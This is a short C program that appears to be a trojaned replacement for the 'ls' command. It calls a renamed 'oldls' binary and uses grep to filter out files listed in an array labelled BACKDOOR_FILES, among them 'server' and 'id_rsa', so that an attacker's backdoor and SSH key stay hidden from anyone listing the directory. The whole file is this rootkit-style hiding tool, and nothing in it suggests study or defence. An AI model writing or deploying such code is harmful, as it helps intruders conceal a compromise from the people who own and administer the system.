#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    // Array of backdoor files to exclude
    const char *BACKDOOR_FILES[] = {"server", "id_rsa", "test"};
    const int num_patterns = sizeof(BACKDOOR_FILES) / sizeof(BACKDOOR_FILES[0]);

    // Command to execute
    char ls_command[1024] = "oldls";

    // Build the grep command
    for (int i = 0; i < num_patterns; i++) {
        // Append each pattern to the command
        snprintf(ls_command + strlen(ls_command), sizeof(ls_command) - strlen(ls_command), " | grep -v -E '%s'", BACKDOOR_FILES[i]);
    }

    // Append tr command to replace newlines with spaces
    strcat(ls_command, " | tr '\\n' ' '");

    // Execute the command
    FILE *fp = popen(ls_command, "r");
    if (fp == NULL) {
        perror("popen failed");
        return 1;
    }

    // Read and output the command results
    char buffer[256];
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        printf("%s", buffer);
    }

    // Close the pipe
    pclose(fp);
    return 0;
}
